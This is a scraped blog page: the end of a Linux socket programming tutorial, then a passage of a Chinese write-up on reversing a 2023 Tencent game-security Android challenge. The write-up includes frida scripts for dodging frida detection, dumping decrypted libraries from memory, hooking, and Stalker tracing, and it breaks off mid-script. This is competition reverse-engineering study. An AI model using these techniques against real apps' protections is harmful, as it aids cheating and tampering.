IPv6 flow information */ struct in6_addr sin6_addr; /* IPv6 address */ uint32_t sin6_scope_id; /* Scope ID (new in 2.4) */ &#125;; struct in6_addr &#123; unsigned char s6_addr[16]; /* IPv6 address */ &#125;; Unix 定义的类型为 sockaddr_un #define UNIX_PATH_MAX 108struct sockaddr_un &#123; sa_family_t sun_family; /* AF_UNIX */ char sun_path[UNIX_PATH_MAX]; /* pathname */ &#125;; 在将 ip 和 port 绑定到 socket 时，我们需要将主机字节序 (小端序) 转换成网络字节序 (大端序), 通常会使用到的函数有 htonl , inet_addr , htons htonl(INADDR_ANY);//Host to Network Long,INADDR_ANY 通常为 0, 相当于 inet_addr (\"0.0.0.0\"), 即监听来自所有 IP 的连接inet_addr(\"127.0.0.1\");// 将点分十进制 IP 地址转换成网络字节序 IP 地址htons(6666);//Host to Network Short, 用来转换 port# listen 服务端使用 listen 来建立一个监听客户端连接的队列 #include &lt;sys/types.h> #include &lt;sys/socket.h>/*@param sockfd: 监听的 socket 描述符@param backlog: 建立的最大连接数@return: 成功返回 0，失败返回 -1，并设置 erron */int listen(int sockfd, int backlog);# accept 服务端接受客户端的连接 #include &lt;sys/types.h> #include &lt;sys/socket.h>/*@param sockfd: 监听的 socket 描述符@param addr: 保存连接的客户端的地址信息@param addrlen: addr 的大小，一般使用 sizeof 来进行计算@return: 成功返回客户端的 socket 文件描述字，失败返回 -1，设置 erron */int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);# connect 客户端向服务端发起连接请求 #include &lt;sys/types.h> #include &lt;sys/socket.h>/*@param sockfd: 监听的 socket 描述符@param addr: 保存连接的客户端的地址信息@param addrlen: addr 的大小，一般使用 sizeof 来进行计算@return: 成功返回客户端的 socket 文件描述字，失败返回 -1，设置 erron */int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);# send, sendto 发送数据 #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param sockfd: 接受数据的 socket@param buf: 发送的数据@param len: 数据长度@param flags: 当这个参数为 0，该函数等价与 write@return: 成功返回发送的字节数，失败返回 -1，并设置 erron */ssize_t send(int sockfd, const void *buf, size_t len, int flags);/* sendto 功能是将数据发送到指定的地址 dest_addr，其他参数基本相同 */ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);# recv, recvfrom 接收数据 #include &lt;sys/types.h>#include &lt;sys/socket.h>/*@param sockfd: 接收的 socket fd@param buf: 接收缓冲区@param len: 缓冲区长度@param flags: 当这个参数为 0，该函数等价与 read@return: 成功返回接受的字节数，失败返回 -1，并设置 erron */ssize_t recv(int sockfd, void *buf, size_t len, int flags);/* recvfrom 从指定的地址 src_addr 接收数据，其他参数与 recv 类似 */ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);# close 关闭由 accept 或者 connect 返回的 socket 描述字 #include &lt;unistd.h>int close(int fd);# 使用 Socket 进行 TCP 通信 # TCP 服务端 // tcp-server.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>int main(void) &#123; int server_fd, client_fd; struct sockaddr_in listen_addr; listen_addr.sin_family = AF_INET;// 使用 IPv4 地址 listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);//INADDR_ANY 表示不管是哪个网卡接收到数据，只要目的端口是 SERV_PORT，就会被服务端接收到 listen_addr.sin_port = htons(8888); //create socket server_fd = socket(AF_INET, SOCK_STREAM, 0); //bind listen_addr to server_fd bind(server_fd, (struct sockaddr *)&amp;listen_addr, sizeof(listen_addr)); //listen server_fd, max listen client num = 10 listen(server_fd, 10); printf(\"TCP server is listening...\\n\"); char send_msg[] = \"hello client\"; while(1) &#123; //accept client connect client_fd = accept(server_fd, (struct sockaddr *)NULL, NULL); //send data send(client_fd, send_msg, sizeof(send_msg), 0); printf(\"Write \\\"hello client\\\" to client ok.\\n\"); //close client fd close(client_fd); &#125; //close server fd close(server_fd); return 0;&#125;# TCP 客户端 //tcp-client.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>#include &lt;netinet/in.h>#include &lt;netdb.h>int main() &#123; int client_fd = 0; struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); server_addr.sin_port = htons(8888); //create socket client_fd = socket(AF_INET, SOCK_STREAM, 0); //connect server connect(client_fd, (struct sockaddr *)&amp;server_addr, sizeof(server_addr)); //recv msg from server char msg_buf[100] = &#123; 0 &#125;; recv(client_fd, msg_buf, 100, 0); printf(\"Client get server msg: %s\\n\", msg_buf); //close fd close(client_fd); return 0;&#125;# 使用 Socket 进行 UDP 通信 # UDP 服务端 // udp-server.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>int main(void) &#123; int server_fd, client_fd; struct sockaddr_in listen_addr; listen_addr.sin_family = AF_INET;// 使用 IPv4 地址 listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);//INADDR_ANY 表示不管是哪个网卡接收到数据，只要目的端口是 SERV_PORT，就会被服务端接收到 listen_addr.sin_port = htons(8888); //create socket server_fd = socket(AF_INET, SOCK_DGRAM, 0); //bind server_addr to server_fd bind(server_fd, (struct sockaddr *)&amp;listen_addr, sizeof(listen_addr)); //recv msg from client struct sockaddr_in client_addr; char msg_buf[100] = &#123; 0 &#125;; recvfrom(server_fd, msg_buf, 100, 0, (struct sockaddr *)&amp;client_addr, (socklen_t *)sizeof(client_addr)); printf(\"Client get server msg: %s\\n\", msg_buf); //close server fd close(server_fd); return 0;&#125;# UDP 客户端 //udp-client.c#include &lt;stdlib.h>#include &lt;stdio.h>#include &lt;unistd.h>#include &lt;sys/types.h>#include &lt;sys/socket.h>#include &lt;sys/un.h>#include &lt;string.h>#include &lt;arpa/inet.h>#include &lt;netinet/in.h>#include &lt;netdb.h>int main() &#123; int client_fd = 0; struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); server_addr.sin_port = htons(8888); //create socket client_fd = socket(AF_INET, SOCK_DGRAM, 0); //send data char send_msg[] = \"hello server\"; sendto(client_fd, send_msg, sizeof(send_msg), 0, (struct sockaddr *)&amp;server_addr, sizeof(server_addr)); printf(\"Write \\\"hello server\\\" to server ok.\\n\"); //close fd close(client_fd); return 0;&#125;# 参考资料 Linux 高级编程 - Socket 编程基础（TCP，UDP） socket 接口的网络协议无关性 一文搞懂 Linux 的 Socket 编程原理 (含实例解析)","categories":[],"tags":[]},{"title":"细品sec2023安卓赛题","slug":"sec-2023","date":"2023-08-31T00:19:57.000Z","updated":"2025-04-08T18:55:11.766Z","comments":true,"path":"sec-2023/","link":"","permalink":"https://oacia.dev/sec-2023/","excerpt":"","text":"# 前言 在今年三月份的时候，我参加了腾讯游戏安全技术竞赛，到现在差不多快过去半年了，当时做这道安卓初赛题目时，也是卡在开头就毫无头绪了，而后看到看雪上的三位大佬 |_|sher 师傅，juice4fun 师傅和 fallw1nd 师傅都分享了他们做这道题目时的解题过程，也是让我重拾了做出这道安卓初赛题的信心，因为需要分心在学习和其他事情上，所以从三月份到七月份也是陆陆续续复现了五个月，一路上走走停停 终于在八月份，我难能可贵的获得了整整一个月的充裕时间，这也让我可以好好去钻研这道对我来说难度极大的安卓题目了，解题的过程中基本上把我能想到的安卓逆向工具用了个遍，每当我在解题的过程中遇到瓶颈时，我总会把这三位大佬的 writeup 打开来反复观摩研究思考为什么要这样做，怎么做效果会更好 直到注册机写完之后纵观整个解题过程，真的是学到了很多 il2CppDumper 是分析 unity 游戏的基础，能有好的开头全靠站在巨人的肩膀上 运行时解密 so 文件，让我首次尝试去手工修复 dump 下来的 so libsec2023.so 中的反调试让我学会使用在安卓手机中断下硬件断点的工具 rwProcMem33, 也开始第一次编译安卓内核，经历了两三个不眠之夜 第一眼见到 CSEL-BR 和 CSET-BR 结构的花指令让我毫无头绪，也让我开始思考 frida-stalker 与 unicorn 的区别所在，最终我选择使用 frida-stalker 辅助分析，IDApython 批量去花的方法，效果很好 BlackObfuscator 混淆让我想起了被 ollvm 的控制流平坦化支配的恐惧，一筹莫展之际，这个月最新的工具 Jeb5.1 竟然能完美去除 BlackObfuscator 混淆，着实让我惊喜不已 在探索 vm 的过程，我也慢慢的摸索出了 vm 题型的解题方法，或许未来遇到 vm 我也能游刃有余了 前言写的有点长了，也算是我在这半年对于这道安卓题的感悟吧哈哈，虽然是安卓方向初赛题，但是对我整个安卓逆向的学习过程意义非凡，这篇文章我也写的尽可能的详细，前后的思维也尽量避免跳跃，每一步的操作基本上都是有据可依的，为之后也同样想要复现这道赛题的朋友尽一点绵薄之力 题目可以在腾讯游戏安全竞赛官网下载 下载链接 我在 github 里面也存了一份上去 备用下载链接 # 初探 apk 首先我们通过 jadx 反编译 mouse_pre.aligned.signed.apk , 通过查看 AndroidManifest.xml 可以知道下列关键信息 包名: com.com.sec2023.rocketmouse.mouse 入口: com.unity3d.player.UnityPlayerActivity 解压该 apk, 通过查看 lib 文件夹内的内容，我们发现了 libil2cpp.so # 尝试使用 Il2CppDumper 获取符号信息 我们使用 Il2CppDumper 尝试解密 global-metadata.dat , 但是却失败了 看了一下 global-metadata.dat 是没有加密的 接下来我们用 ida 反编译 libil2cpp.so , 发现被加密了 # dump 解密后的 libil2cpp.so 接下来我准备用 frida 来把解密后的 libil2cpp.so 从内存中 dump 下来 但是当我用 frida 将代码注入进去后，apk 提示 hack detect , 然后就退出了 之后我不用 frida 注入这个 apk, 但是后台依旧运行着 frida-server,apk 依然弹出 hack detect 后退出 通过这一点我大致可以判断它的检测方式有这两种可能 检测运行的程序名称有没有 frida-server 检测 frida-server 的端口 我们一个一个去验证一下 首先我们把后台运行的 frida-server 名称改成 fs 试试 blueline:/data/local/tmp # ./fs修改完后依旧弹出 hack detect 那我们再去试一试修改 frida-server 的端口 blueline:/data/local/tmp # ./fs -l 0.0.0.0:1234端口修改之后用 frida 注入也不弹窗了 现在我们可以用 frida 把解密后的 libil2cpp.so dump 下来，脚本如下 function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = dir + \"/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); // 如果报错为 Error: access violation accessing, 那么可以尝试添加下面的这一行代码，libso.base 加上的值是通过 address (access violation accessing)-address (base) 计算出来的 //Memory.protect(ptr(libso.base.add(0x13b7000)), libso.size-0x13b7000, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125; &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;在使用 frida 运行脚本之前需要注意去做一下端口转发 adb forward tcp:1234 tcp:1234随后进行 frida 注入 frida -H 127.0.0.1:1234 -l \"D:\\frida\\sec2023\\global-metadata_dump.js\" -f \"com.com.sec2023.rocketmouse.mouse\" # 再次使用 Il2CppDumper 获取符号信息 直接把 dump 下来的 libil2cpp.so 放到 Il2CppDumper 中，成功获取符号 # 修复 dump 下来的 so 对于 dump 下来的 so 文件，所有的段 (segment) 和节 (section) 的偏移都是在虚拟空间中的偏移 (即映射到进程空间的虚拟地址偏移), 但静态分析工具分析 so 时所使用的偏移仍然为在实际文件中的偏移 (即相对于文件开头的字节偏移量), 错误的偏移导致静态分析工具如 IDA 等无法分析 dump 下来的 so 所以我们需要将 segment 和 section 在实际文件中的偏移替换为在虚拟空间中的偏移，这些偏移由 program header table 和 secion header table 内的成员指出 我们将 libil2cpp.so 和 libil2cpp.so_0x712a997000_0x13cc000.so 一并拖入 010 editor 中，两个文件相互对比进行修复 在 010editor 中复制一个成员的值到另一个成员中，只需要在软件界面的 Template Results 中单击想要复制的值按下 Ctrl + Shift + C , 然后单击需要替换的值，按下 Ctrl + Shift + V 即可完成替换 # 修正 段 (segment) 的偏移 段 (segment) 的位置和大小由程序头表 (Program Header Table) 中的这四个成员决定 成员名称 含义 p_offset_FROM_FILE_BEGIN 在实际文件中的偏移 p_vaddr_VIRTUAL_ADDRESS 在虚拟空间中的偏移 p_filesz_SEGMENT_FILE_LENGTH 在实际文件中的大小 p_memsz_SEGMENT_RAM_LENGTH 在虚拟空间中的大小 在 libil2cpp.so_0x712a997000_0x13cc000.so 中我们将 program_header_table 中每一个 element 的 p_vaddr_VIRTUAL_ADDRESS 的值复制到 p_offset_FROM_FILE_BEGIN , p_memsz_SEGMENT_RAM_LENGTH 的值复制到 p_filesz_SEGMENT_FILE_LENGTH # 修正 节头表 (secion header table) 的偏移 节头表 (secion header table) 的位置在最后一个段 (segment) 之后，我们可以从 ELF 文件的 Execution View 直观看出 由下图所示， libil2cpp.so_0x712a997000_0x13cc000.so 中 section_header_table 在实际文件中的偏移为 0x11AB778 , 我们需要将其修改为在虚拟空间中的偏移，这个值为 0x13CB778 , 计算过程如下，此处所涉及计算的成员的值是在 program_header_table 的最后一个 element , 即 program_table_entry64_program_table_element[10] section_header_table 在虚拟空间中的偏移: 0x13CB778 = 0x00000000013BC000 + 0xF778 = p_vaddr_VIRTUAL_ADDRESS + p_memsz_SEGMENT_RAM_LENGTH Section Header Table 和 Program Header Table 并不是一定要位于文件开头和结尾的，其位置由 ELF Header 指出 决定 section_header_table 起始地址的成员为 elf_header-&gt;e_shoff_SECTION_HEADER_OFFSET_IN_FILE , 位置如下图所示，在修改完成后，按下 F5 重新运行模板 ELF.bt # 修补 section 的内容 在我们修正 节头表 (secion header table) 的偏移后，节头表所在的区域是没有内容的，如下图所示，所以需要从 libil2cpp.so 中复制节 (section) 的内容到 dump 下来的 so 中 我们在 libil2cpp.so 点击 struct section_header_table 并按下 Ctrl + Shift + C , 然后回到 libil2cpp.so_0x712a997000_0x13cc000.so 中，选中 section_header_table 然后按下 Ctrl + Shift + V , 按下 F5 重新运行模板 ELF.bt # 恢复节 (section) 的名称 可以发现修补了节 (section) 的内容之后，section 的名称依旧是乱码 这是什么原因呢？ ELF 文件中的每个 section 都是有名字的，比如 .data 、 .text 、 .rodata ，每个名字都是一个字符串，既然是字符串就需要一个字符串池来保存，而这个字符串池也是一个 section ，或者说准备一个 section 用来维护一个字符串池，这个字符串池保存了其他 section 以及它自己的名字。这个特殊的 section 叫做 .shstrtab ，所有 section 的头部是连续存放在一起的，类似一个数组， e_shstrndx 变量是 .shstrtab 在这个数组中的下标。 首先我们要明白 section 的名称是如何通过索引找到的，在 libil2cpp.so_0x712a997000_0x13cc000.so 中，找到 elf_header-&gt;e_shtrndx_STRING_TABLE_INDEX , 这个的值为 26 (0x1A), 说明了 section_header_table-&gt;section_table_element[26] 存储了所有 section 的名称 section_header_table-&gt;section_table_element[26] 中 s_offset 的值决定了 section 的名称将从 1199370h 去索引 我们可以在 dump 前后的 libil2cpp.so 都跳转到这个地址去看看，在 010editor 中进行地址跳转只需右键该值选择 Goto Address 即可 section 的所有名称都在这个地方 之后我们要将 section 的符号名称从原来的 so 复制到 dump 下来的 so 里面，位置就是我们之前分析出来的 section_table_element[26] 中 s_offset 所指向的物理内存地址，即选中 libil2cpp.so 从 0x1199370h 到 0x1199470h 按下 Ctrl + Shift + C , 然后将光标移动到 libil2cpp.so_0x712a997000_0x13cc000.so 的 119A370h 处，按下 Ctrl + Shift + V # 修正 节 (section) 的偏移 节 (section) 的位置和大小由节头表 (secion_header_table) 中这两个成员决定 成员名称 含义 s_addr 如果此 section 需要映射到进程空间，此成员指定映射的起始地址；如不需映射，此值为 0 s_offset 此 section 相对于文件开头的字节偏移量。如果 section 类型为 SHT_NOBITS , 表明该 section 在文件中不占空间，这时 sh_offset 没什么用 修正 节 (section) 的偏移有两条规则 如果 s_addr 为 0, 无需修改 s_offset 如果 s_addr 不为 0, 则将 s_addr 的值复制给 s_offset 修正完成后，按下 F5 重新运行模板 ELF.bt , 可以发现 section 的名称已经恢复，同时也有了 dynamic_symbol_table # 在 IDA 中恢复符号 然后，我们将 libil2cpp.so_0x712a997000_0x13cc000.so 拖入 IDA 中进行分析，待分析完成后，点击如图所示的选项重新定位基址为 0x712a997000 , 这样可以分析出更多的符号 之后，我们点击 File-&gt;Script file... 运行 il2cppdumper 中的 ida_with_struct_py3.py , 需要注意的这个脚本需要运行两次，第一次选择 script.json , 第二次选择 il2cpp.h 处理之后的效果如下 # 寻找 OK 按钮调用的函数 接下来需要知道这个 OK 按钮调用的函数 我们可以使用这个工具 frida-il2cppDumper, 用法就直接用 frida 注入 _agent.js 就可以了 frida -H 127.0.0.1:1234 -l \"D:\\frida\\frida-il2cppDumper-main\\_agent.js\" -f \"com.com.sec2023.rocketmouse.mouse\"当我们进入该 apk 之后，下列函数被调用 method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:466300 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:46618C private Void Start()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465E90 private Void oO0oOo0()&#123; &#125; method end我们去看一下最后调用的这个函数 oO0oOo0 , 进入 IDA 去进行分析，很明显是生成 TOKEN 的地方 当我们点击小键盘上的 OK 按钮后，下列函数被调用，由于调用的函数太多，我这里仅仅从首次调用的函数开始，截取了部分输出作为示例 method call nameSpaze: class:&lt;>c__DisplayClass14_0 methodPointer offset in IDA:4663B0 internal Void &lt;Start>b__0()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465FDC private Void iI1Ii(GameObject go) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465880 private Void iI1Ii(iII1i _info) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465AB0 private Void iI1Ii(UInt64 i1I) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:4660E8 public Void .ctor(UInt16[] OoOOO00, Int32 oOOO0O0O, UInt32[] OOoOO0) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:46A55C private Void O000O000000o()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:oO0OoOOo methodPointer offset in IDA:46A4D8 private Void .cctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:46AD44 private Void oOOoO0o0()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:46B578 private Void O00O00000o()&#123; &#125; method endSmallKeyboard 类被调用了很多次，我们可以去 dump.cs 里面搜索一下，此处定义了 KeyType 不同的值对应的含义，那么这个 EnterKey 就是 OK 按钮了 回到 IDA , 我们再去搜索一下 SmallKeyboard , 找到 SmallKeyboard__iI1Ii(SmallKeyboard_o *this, SmallKeyboard_iII1i_o *info, const MethodInfo *method) 这个函数，这是与 KeyType 有关的函数，显而易见，我们需要重点分析的是 KeyType == 2 的情况 对于这行代码，我的猜测是 v13 存储了我输入的值，我们可以使用 frida 去 hook System_Convert__ToUInt64_486054767044 的返回值来验证我们的猜想 function hook_native()&#123; // 程序入口Java.perform(function() &#123; // 获取模块 var module = Process.getModuleByName(\"libil2cpp.so\") // 转为函数地址 var addr=module.base.add(\"0x85b9c4\"); // 获取函数入口 var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // 函数 hook 钩子附加 Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('hook success'); console.log(args[0]); console.log(args[1]); &#125;, onLeave: function (retval) &#123; console.log(\"retvalue is :\", retval.toInt32()); console.log('method onleave'); &#125; &#125;);&#125;);&#125;setImmediate(function()&#123; setTimeout(hook_native, 1000);&#125;,0);当我输入 123456 , 并点击 OK 按钮后，frida 的回显如下，可以印证我们的猜测是正确的，v13 是我们输入的数字 v13 作为参数传入了 SmallKeyboard__iI1Ii_486050613936 内，那么这应该就是我们要寻找的加密逻辑 经过两个 B 跳转后，我们来到了这里 这段汇编很有意思，我们去分析一下， off_712BD51FF0 存储的是导入函数 g_sec2023_p_array 的地址，而 g_sec2023_p_array 的函数定义在 libsec2023.so 中， BR 指令是无条件寄存器跳转，那么这四行 arm 汇编的意义就是调用 g_sec2023_p_array 偏移 0x48 处的函数 来到 libsec2023.so 我们即可找到相对应的导出函数 sub_31164 那么显而易见，关键的逻辑就在 libsec2023.so 中的 sub_31164 了 # 进入 libsec2023.so 分析 对 libsec2023.so 的 sub_31164 hook 一下 function hook_sub_31164()&#123; // 程序入口Java.perform(function() &#123; // 获取模块 var module = Process.getModuleByName(\"libsec2023.so\") // 转为函数地址 var addr=module.base.add(\"0x31164\"); // 获取函数入口 var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // 函数 hook 钩子附加 Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('hook success'); console.log(args[0]); console.log(args[1]); console.log(args[2]); &#125;, onLeave: function (retval) &#123; console.log(\"retvalue is :\", retval.toInt32()); console.log('method onleave'); &#125; &#125;);&#125;);&#125;rpc.exports = &#123; hook_sub_35404: hook_sub_35404&#125;但是当我注入将这段 frida 代码注入到 libsec2023.so 后，程序在短暂的延迟后显示 hack detect 后退出了 我们可以使用 frida Stalker 来查看这个 so 调用函数的过程 为了使用上的方便，我写了一个 IDA 插件来实现下面的过程，插件地址:https://github.com/oacia/stalker_trace_so，这应该算是我第一次造轮子吧：) 首先使用如下 idaPython 脚本打印出 libsec2023.so 的所有函数的地址和名称 import idautilsimport idcfunc_addr = []func_name = []for i in idautils.Functions(): func_addr.append(i) func_name.append(idc.get_func_name(i))for i in func_addr: print(f\"&#123;hex(i)&#125;, \",end='')print('')for i in func_name: print(f\"\\\"&#123;i&#125;\\\", \",end='')将上面 IDApython 所打印出的内容填入下面 frida 代码的变量 func_addr 和 func_name 中 var func_addr = [...]var func_name = [...]function hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; //hook_sub_3530C(); var times = 1; var module = Process.getModuleByName(\"libsec2023.so\"); this.pid = Process.getCurrentThreadId(); console.log(\"start Stalker!\"); Stalker.follow(this.pid,&#123; events:&#123; call:false, ret:false, exec:false, block:false, compile:false &#125;, onReceive:function(events)&#123; &#125;, transform: function (iterator) &#123; var instruction = iterator.next(); do&#123; if (func_addr.indexOf(instruction.address - module.base) != -1)&#123; console.log(\"call\" + times+ \":\" + func_name[func_addr.indexOf(instruction.address - module.base)]) times=times+1 &#125; iterator.keep(); &#125; while ((instruction = iterator.next()) !== null); &#125;, onCallSummary:function(summary)&#123; &#125; &#125;); console.log(\"Stalker end!\"); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen, \"libsec2023.so\")打开 apk 后 frida 输出如下 call1:JNI_OnLoadcall2:sub_FF14call3:.memsetcall4:.vsnprintfcall5:.timecall6:.localtimecall7:.__android_log_printcall8:sub_10070call9:.fopencall10:sub_21000call11:.pthread_oncecall12:sub_21054call13:sub_412CCcall14:.malloccall15:sub_21098call16:sub_FABCcall17:sub_1010Ccall18:sub_10194call19:sub_11C4Ccall20:.pthread_mutex_initcall21:sub_103D0call22:sub_2BCA8call23:sub_125E4call24:sub_12660call25:sub_1CE70call26:sub_1CE34call27:sub_1C664call28:.pthread_mutex_lockcall29:.pthread_mutex_unlockcall30:.strlencall31:sub_125F0call32:sub_1D998call33:sub_2C67Ccall34:sub_2C40Ccall35:.__strlcpy_chkcall36:.__strlen_chkcall37:sub_11BC4call38:sub_2CCC0call39:sub_355F0call40:sub_35630call41:sub_356C4call42:sub_35700call43:sub_11DF0call44:sub_35870call45:sub_36940call46:sub_36B34call47:sub_36B9Ccall48:sub_36BC8call49:sub_36BF0call50:sub_36E00call51:sub_36E70call52:sub_36ED0call53:sub_36F00call54:sub_36F3Ccall55:nullsub_17call56:sub_36C8Ccall57:sub_36CB8call58:sub_2E318call59:sub_2E288call60:sub_2D590call61:sub_1F450call62:sub_20FD0call63:.fstatcall64:sub_2DB5Ccall65:sub_1FE3Ccall66:sub_1FB70call67:.sscanfcall68:sub_200C0call69:.memcpycall70:sub_1F6C0call71:sub_1F8A4call72:.freecall73:sub_36D38call74:sub_36D70call75:sub_36DA4call76:sub_37060call77:sub_41368call78:sub_36A20call79:sub_36D10call80:sub_3C6A4call81:sub_369B0call82:sub_3DF74call83:sub_3A054call84:sub_3A090call85:sub_3A0FCcall86:sub_3A138call87:sub_24364call88:sub_3852Ccall89:sub_38D9Ccall90:sub_36A90call91:sub_3F2B0call92:sub_36120call93:sub_36144call94:sub_370ACcall95:sub_36558call96:sub_21BACcall97:sub_21C20call98:sub_21F50call99:sub_21DB4call100:j_.pthread_mutex_lockcall101:j_.pthread_mutex_unlockcall102:sub_11E30call103:sub_11C60call104:.pthread_attr_initcall105:.pthread_attr_setstacksizecall106:.pthread_attr_setdetachstatecall107:.pthread_createcall108:.pthread_attr_destroycall109:sub_11C6Ccall110:j_j_.free_2call111:j_.freecall112:sub_37254call113:sub_37740call114:sub_377A8call115:sub_377D8call116:sub_37804call117:sub_37A64call118:sub_37AD4call119:sub_37B34call120:sub_37B64call121:sub_37BA0call122:nullsub_18call123:sub_3789Ccall124:sub_378C4call125:sub_20DD0call126:sub_20580call127:sub_20CB0call128:sub_20EBCcall129:j_.statcall130:.statcall131:sub_373B4call132:sub_1240Ccall133:sub_1F74Ccall134:.lseekcall135:sub_1F9ECcall136:sub_1FA34call137:sub_37940call138:sub_37974call139:sub_379A8call140:sub_1235Ccall141:sub_37134call142:sub_37184call143:sub_371ACcall144:sub_376CCcall145:sub_37704call146:sub_37738call147:sub_3715Ccall148:sub_36580call149:sub_36538call150:sub_36178...# 对 libsec2023.so 打下硬件断点 这里需要用到的工具是 rwprocmem33 , 具体的编译和使用可以移步我博客内的这篇文章进行阅读，这里不在过多赘述 运行下面的 frida 代码获取 libsec2023.so 的基址 function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", 